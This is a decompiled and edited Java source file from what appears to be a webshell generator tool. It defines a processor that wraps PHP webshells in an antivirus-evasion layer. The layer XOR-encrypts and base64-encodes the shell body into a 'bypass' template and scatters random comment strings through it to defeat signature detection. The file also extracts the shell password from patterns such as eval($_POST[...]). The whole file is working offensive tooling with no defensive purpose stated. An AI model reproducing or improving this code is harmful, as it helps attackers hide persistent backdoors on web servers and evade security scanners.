//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.shellprocessor.phpInclude;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import shells.cryptions.phpXor.Generate;
import util.Log;
import util.functions;

@GenerateProcessor(
    DisplayName = "PHP 全版本常量文件包含（include_once）",
    superTemplate = {"php"}
)
public class PhpConstInclude implements ShellProcessor {
    private static final String CHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|";
    private static final String UPPER_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private static final SecureRandom RANDOM = new SecureRandom();

    public PhpConstInclude() {
    }

    public static String generateRandomString(Boolean isUpper) {
        int length = RANDOM.nextInt(7) + 10;
        StringBuilder sb = new StringBuilder();
        int i;
        int index;
        if (isUpper) {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt("ABCDEFGHIJKLMNOPQRSTUVWXYZ".length());
                sb.append("ABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(index));
            }

            return sb.toString();
        } else {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|".length());
                sb.append("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|".charAt(index));
            }

            return "/*" + sb.toString() + "*/";
        }
    }

    public static String xorEncrypt(String data, String key) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] keyBytes = digest.digest(key.getBytes(StandardCharsets.UTF_8));
        byte[] dataBytes = data.getBytes(StandardCharsets.UTF_8);
        byte[] encrypted = new byte[dataBytes.length];

        for(int i = 0; i < dataBytes.length; ++i) {
            encrypted[i] = (byte)(dataBytes[i] ^ keyBytes[i % keyBytes.length]);
        }

        return Base64.getEncoder().encodeToString(encrypted);
    }

    public static String BypassReplace(String data, String pass) {
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/templatebypass.bin");
            String code = new String(functions.readInputStream(inputStream), StandardCharsets.UTF_8);
            inputStream.close();
            data = code.replace("8WRl51GXKPkn8kusti7u8M8zWg==", xorEncrypt(data, pass));
            data = data.replace("MYPATH", generateRandomString(true));
            String target = "/*zs*/";
            StringBuilder result = new StringBuilder(data);

            for(int startIndex = 0; (startIndex = result.indexOf(target, startIndex)) != -1; ++startIndex) {
                result.replace(startIndex, startIndex + target.length(), generateRandomString(false));
            }

            data = result.toString();
        } catch (Exception var7) {
            Log.error(var7);
        }

        return data;
    }

    /**
     * 框架只调用 2 参数重载。旧实现直接返回 new byte[0]，导致生成模板 0KB。
     * 密码已在 GenerateShellLoder 阶段写入 shell 正文，这里解析后走真正的免杀包装。
     */
    public byte[] doProcessor(byte[] shell, String suffix) {
        if (shell == null || shell.length == 0) {
            return shell == null ? new byte[0] : shell;
        }
        String content = new String(shell, StandardCharsets.UTF_8);
        String pass = extractPass(content);
        return BypassReplace(content, pass).getBytes(StandardCharsets.UTF_8);
    }

    public byte[] doProcessor(byte[] shell, String suffix, String pass) {
        if (shell == null || shell.length == 0) {
            return shell == null ? new byte[0] : shell;
        }
        return BypassReplace(new String(shell, StandardCharsets.UTF_8), pass == null ? "" : pass).getBytes(StandardCharsets.UTF_8);
    }

    /** 从已替换 {pass} 的 PHP 模板中提取密码。 */
    static String extractPass(String shellContent) {
        if (shellContent == null || shellContent.isEmpty()) {
            return "";
        }
        // $pass='xxx';  /  $pass = "xxx";
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("\\$pass\\s*=\\s*['\"]([^'\"]*)['\"]")
                .matcher(shellContent);
        if (m.find()) {
            return m.group(1);
        }
        // eval($_POST["xxx"]) / $_POST['xxx']
        m = java.util.regex.Pattern
                .compile("\\$_POST\\s*\\[\\s*['\"]([^'\"]*)['\"]\\s*\\]")
                .matcher(shellContent);
        if (m.find()) {
            return m.group(1);
        }
        return "";
    }
}
